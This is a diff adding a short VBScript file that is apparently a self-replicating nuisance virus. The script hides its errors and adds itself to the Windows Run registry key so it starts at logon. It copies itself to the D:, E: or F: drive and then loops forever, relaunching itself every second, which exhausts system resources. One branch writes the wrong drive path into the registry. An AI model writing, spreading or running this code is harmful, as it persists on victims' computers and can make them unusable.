@@ -1,0 +1,30 @@
+On Error Resume Next
+Set shell=Wscript.CreateObject("Wscript.Shell")
+Set fso=Wscript.CreateObject("Scripting.FileSystemObject")
+ll=Wscript.ScriptFullName
+ll2=Wscript.ScriptName
+'Boom sector a
+'sector a can be changed......
+
+shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\BB",ll,"REG_SZ"
+if not fso.fileexists("D:\"&ll2) then
+if fso.driveexists("D:\") then
+fso.Copyfile ll,"D:\" & ll2
+shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\BB","D:\"&ll2,"REG_SZ"
+end if	
+elseif not fso.fileexists("E:\"&ll2) then
+if fso.driveexists("E:\") then
+fso.CopyFile ll,"E:\" & ll2
+shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\BB","E:\"&ll2,"REG_SZ"
+end if 
+elseif not fso.fileexists("F:\"&ll2) then 
+if fso.driveexists("F:\") then
+fso.CopyFile ll,"F:\" & ll2
+shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\BB","E:\"&ll2,"REG_SZ"
+end if 
+end if 
+do
+m=m+1
+Wscript.Sleep 1000
+shell.run Wscript.ScriptName
+loop
